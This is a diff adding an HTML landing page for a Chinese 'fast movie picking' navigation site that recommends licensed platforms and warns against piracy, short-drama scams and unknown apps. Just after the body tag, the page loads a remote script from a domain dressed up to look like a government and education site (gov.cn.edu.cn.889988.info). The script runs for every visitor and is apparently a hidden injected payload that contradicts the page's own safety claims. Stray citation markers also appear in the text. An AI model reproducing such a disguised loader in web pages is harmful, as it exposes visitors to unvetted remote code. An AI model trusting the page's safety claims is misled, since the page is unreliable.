@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>草民电影网宅急看 - 宅家快速选片与正版观影导航</title>
+<meta name="description" content="草民电影网宅急看做宅家快速选片：按心情/时长/类型秒挑正片，提供正版平台入口、短剧避坑、防盗版提醒与观影小贴士，移动端自适应，不提供盗版播放。">
+<meta name="keywords" content="草民电影网宅急看,宅家看片,快速选片,正版观影导航,短剧避坑,防盗版,影视导航">
+<meta name="author" content="草民电影网宅急看">
+<link rel="canonical" href="https://caomindianyingwangzhaijikan-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#f6f7fb;color:#27303f;line-height:1.78}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+/* 导航 */
+.nav{position:sticky;top:0;z-index:99;background:rgba(246,247,251,.92);backdrop-filter:blur(8px);border-bottom:2px solid #ff7a3c}
+.nav__box{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1rem;flex-wrap:wrap;gap:.5rem}
+.nav__logo{font-weight:900;font-size:1.25rem;color:#ff7a3c}
+.nav__logo b{color:#1c2330}
+.nav__links{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav__links a{padding:.4rem .8rem;border-radius:999px;font-size:.86rem;color:#5b6678}
+.nav__links a:hover{background:#eef1f7;color:#ff7a3c}
+
+/* Hero */
+.hero{max-width:1200px;margin:2rem auto;padding:0 1rem}
+.hero__card{border-radius:26px;overflow:hidden;background:
+  radial-gradient(circle at 86% 12%,rgba(255,122,60,.22),transparent 55%),
+  linear-gradient(135deg,#eef2f8,#dfe7f3 55%,#cfe0e8);
+  display:grid;grid-template-columns:1.3fr .7fr;border:2px solid #d7deea}
+.hero__left{padding:3rem 2rem}
+.hero__tag{display:inline-block;font-size:.74rem;letter-spacing:2px;color:#ff7a3c;border:1px solid #ff7a3c;padding:.2rem .8rem;border-radius:999px;margin-bottom:1rem;background:#fff}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.15;margin-bottom:1rem;color:#1c2330}
+.hero h1 em{font-style:normal;color:#ff7a3c}
+.hero p{color:#4a5568;max-width:560px;margin-bottom:1.6rem}
+.hero__btn{display:inline-block;background:#ff7a3c;color:#fff;font-weight:800;padding:.8rem 2rem;border-radius:999px}
+.hero__right{display:flex;align-items:center;justify-content:center;font-size:6.5rem}
+
+/* 快速筛条 */
+.quick{max-width:1200px;margin:1.4rem auto 0;padding:0 1rem}
+.quick__box{display:flex;flex-wrap:wrap;gap:.6rem}
+.qbtn{background:#fff;border:1px solid #d7deea;border-radius:999px;padding:.5rem 1rem;font-size:.85rem;font-weight:600;color:#27303f}
+.qbtn b{color:#ff7a3c}
+
+/* 通用 */
+.wrap{max-width:1200px;margin:3.5rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem}
+.head h2{font-size:1.6rem;color:#1c2330}
+.head h2 span{color:#ff7a3c}
+.head a{margin-left:auto;color:#5b6678;font-size:.85rem}
+
+/* 栏目1：宅急看片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.card{background:#fff;border:1px solid #d7deea;border-radius:18px;padding:1.2rem;transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:#ff7a3c;box-shadow:0 18px 40px rgba(255,122,60,.18)}
+.card__emo{font-size:2rem}
+.card h3{font-size:1rem;margin:.4rem 0;color:#1c2330}
+.card p{font-size:.84rem;color:#5b6678}
+.card__min{display:inline-block;margin-top:.5rem;font-size:.72rem;color:#ff7a3c;background:#fff1e8;padding:.15rem .6rem;border-radius:999px}
+
+/* 栏目2：去哪看 双栏 */
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
+.col{background:#fff;border:1px solid #d7deea;border-radius:18px;padding:1.4rem}
+.col h3{color:#ff7a3c;margin-bottom:.8rem;font-size:1.1rem}
+.col ul{margin-left:1.1rem;font-size:.9rem;color:#4a5568}
+.col li{margin:.45rem 0}
+
+/* 栏目3：短剧避坑 步骤 */
+.steps{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.2rem}
+.step{background:#fff;border:1px solid #d7deea;border-radius:16px;padding:1.3rem}
+.step__no{font-size:2rem;font-weight:900;color:#ff7a3c}
+.step h4{margin:.3rem 0;color:#1c2330}
+.step p{font-size:.86rem;color:#4a5568}
+
+/* 栏目4：正版平台 芯片 */
+.chips{display:flex;flex-wrap:wrap;gap:.8rem}
+.chip{padding:.7rem 1.1rem;border-radius:14px;background:#fff;border:1px solid #ff7a3c;color:#1c2330;font-weight:600}
+.chip small{display:block;font-weight:400;color:#5b6678;font-size:.74rem}
+
+/* 栏目5：防盗版 */
+.warn{background:#fff5f0;border:2px dashed #ff7a3c;border-radius:18px;padding:1.4rem 1.6rem}
+.warn h3{color:#ff7a3c;margin-bottom:.6rem}
+.warn ul{margin-left:1.2rem;color:#4a5568;font-size:.9rem}
+.warn li{margin:.3rem 0}
+
+/* 页脚 */
+.foot{margin-top:4rem;background:#1c2330;color:#aeb8c7;text-align:center;padding:2.5rem 1rem;border-top:3px solid #ff7a3c}
+.foot b{color:#fff}
+.foot a{color:#ff9a6b;margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#7c8698}
+
+@media(max-width:880px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__right{min-height:140px;font-size:4.5rem}
+  .cols{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.3rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">草民电影网<b>宅急看</b></div>
+    <nav class="nav__links">
+      <a href="#quickpick">宅急挑片</a>
+      <a href="#where">去哪看</a>
+      <a href="#shortdrama">短剧避坑</a>
+      <a href="#legal">正版平台</a>
+      <a href="#safe">防盗版</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">SOFA MODE / 宅家快速选片</span>
+      <h1>草民电影网宅急看<br><em>躺沙发上，3 分钟定好今晚看啥</em></h1>
+      <p>“宅急看”不是“盗版秒播”：本站立场是——按心情、按时长、按类型快速挑片，再跳到正版平台看。不聚合网盘、不装专用播放器、不发“高清完整版”盗录资源、不推擦边短剧。</p>
+      <a href="#quickpick" class="hero__btn">马上挑一部 ›</a>
+    </div>
+    <div class="hero__right">🛋️</div>
+  </div>
+</section>
+
+<div class="quick">
+  <div class="quick__box">
+    <div class="qbtn">⏱️ <b>90 分钟</b> 内看完</div>
+    <div class="qbtn">🛋️ 不想动脑 → <b>喜剧/治愈</b></div>
+    <div class="qbtn">🧠 脑子在线 → <b>悬疑/纪录</b></div>
+    <div class="qbtn">👵 陪长辈 → <b>国产老片/戏曲</b></div>
+    <div class="qbtn">📱 竖屏碎片 → <b>正版短剧入口</b></div>
+    <div class="qbtn">🌙 睡前 → <b>慢片/散文电影</b></div>
+  </div>
+</div>
+
+<section class="wrap" id="quickpick">
+  <div class="head"><h2>宅急<span>挑片</span></h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="card"><div class="card__emo">🛋️</div><h3>下班不动脑</h3><p>轻喜剧、公路片、群口戏，沙发一陷就合适。</p><span class="card__min">80–110 分钟</span></article>
+    <article class="card"><div class="card__emo">🌿</div><h3>情绪回血</h3><p>海边小店、种田、遛狗、写信，治愈不催泪。</p><span class="card__min">95 分钟左右</span></article>
+    <article class="card"><div class="card__emo">🕵️</div><h3>脑子还醒着</h3><p>本格悬疑、真实犯罪纪录片、人物传记。</p><span class="card__min">110–130 分钟</span></article>
+    <article class="card"><div class="card__emo">📼</div><h3>老片新看</h3><p>修复版国产片、老港片、公版黑白片。</p><span class="card__min">片长随年代</span></article>
+    <article class="card"><div class="card__emo">📱</div><h3>竖屏碎片时间</h3><p>正版短剧去抖音/快手/B站搜，不选“全集网盘”。</p><span class="card__min">单集 1–3 分钟</span></article>
+    <article class="card"><div class="card__emo">🌙</div><h3>睡前别太炸</h3><p>慢镜头、城市夜、自然声、无 jump scare。</p><span class="card__min">70–90 分钟</span></article>
+  </div>
+</section>
+
+<section class="wrap" id="where">
+  <div class="head"><h2>挑完<span>去哪看</span></h2><a href="#">更多 ›</a></div>
+  <div class="cols">
+    <div class="col">
+      <h3>🎬 电影 / 老片</h3>
+      <ul>
+        <li>1905电影网：国产经典、正版老片</li>
+        <li>央视频 / 央视网：官方纪录片、主旋律经典</li>
+        <li>咪咕视频免费专区：国产/译制/动画</li>
+        <li>哔哩哔哩正版区：老动画、修复短片、影评二创</li>
+        <li>互联网档案馆：公版老电影</li>
+      </ul>
+    </div>
+    <div class="col">
+      <h3>📱 短剧 / 竖屏</h3>
+      <ul>
+        <li>抖音短剧：认准官方账号/平台内播放</li>
+        <li>快手小剧场：平台内完播，不跳外部群</li>
+        <li>芒果 TV / 腾讯微短剧：有发行资质的栏目</li>
+        <li>红果短剧等合规 App：看内嵌播放，不装“破解版”</li>
+        <li>别信“全 99 集网盘打包”</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="shortdrama">
+  <div class="head"><h2>短剧<span>避坑</span></h2><a href="#">更多 ›</a></div>
+  <div class="steps">
+    <div class="step"><div class="step__no">01</div><h4>“全集网盘”别点</h4><p>短剧正版通常在平台内按集播，打包网盘多是引流/侵权。[12](@ref)</p></div>
+    <div class="step"><div class="step__no">02</div><h4>“充值解锁”看主体</h4><p>付款前看是不是平台内购买，不是私码/客服微信/支付宝个人转账。</p></div>
+    <div class="step"><div class="step__no">03</div><h4>擦边标题直接划走</h4><p>“成人短剧/走光/偷拍/换妻”类标题本身违规。[9](@ref)</p></div>
+    <div class="step"><div class="step__no">04</div><h4>不装“短剧专用APP”</h4><p>来源不明的 apk 可能带广告 SDK、扣费、跳转赌博。</p></div>
+    <div class="step"><div class="step__no">05</div><h4>“限时免费”别急</h4><p>正规平台不会用恐吓式弹窗逼你马上看。</p></div>
+    <div class="step"><div class="step__no">06</div><h4>收藏正版入口</h4><p>抖音/快手/芒果/腾讯内搜剧名，比收藏镜像站稳。</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="legal">
+  <div class="head"><h2>正版<span>平台清单</span></h2><a href="#">更多 ›</a></div>
+  <div class="chips">
+    <div class="chip">1905电影网<small>国产老片/正版经典</small></div>
+    <div class="chip">央视频<small>官方纪录片/主旋律</small></div>
+    <div class="chip">哔哩哔哩<small>正版动画/老片/二创</small></div>
+    <div class="chip">咪咕视频<small>免费专区/译制片</small></div>
+    <div class="chip">西瓜视频<small>下映国产片/纪录片</small></div>
+    <div class="chip">芒果TV<small>短剧/综艺/剧集</small></div>
+    <div class="chip">腾讯视频<small>微短剧/电影/剧集</small></div>
+    <div class="chip">抖音/快手<small>平台内短剧搜索</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="safe">
+  <div class="head"><h2>防盗版<span>提醒</span></h2><a href="#">更多 ›</a></div>
+  <div class="warn">
+    <h3>⚠️ 宅急看不干的几件事</h3>
+    <ul>
+      <li>不提供“院线刚下片的高清完整版” → 盗录/侵权，观众也可能踩法律风险 [12](@ref)</li>
+      <li>不聚合网盘解压码、不加群发资源 → 灰产引流</li>
+      <li>不要求装“专用播放器 / 解码器 / 浏览器插件” → 捆绑风险 [5](@ref)</li>
+      <li>不挂“立即播放+博彩弹窗+假系统警告” → 直接关</li>
+      <li>不把成人/擦边短剧当栏目 → 违规内容不碰 [9](@ref)</li>
+    </ul>
+  </div>
+</section>
+
+<footer class="foot">
+  <div><b>草民电影网宅急看</b> · 宅家快速选片 / 正版入口 / 短剧避坑 / 防盗版导航</div>
+  <div style="margin-top:.6rem">
+    <a href="#quickpick">宅急挑片</a>|
+    <a href="#where">去哪看</a>|
+    <a href="#shortdrama">短剧避坑</a>|
+    <a href="#legal">正版平台</a>|
+    <a href="#safe">防盗版</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://caomindianyingwangzhaijikan-h5.github.io</small>
+  <small>© 2025 草民电影网宅急看 影视导航站；不提供盗版影片、不聚合网盘资源、不提供成人内容、不引导安装第三方播放器</small>
+</footer>
+
+</body>
+</html>
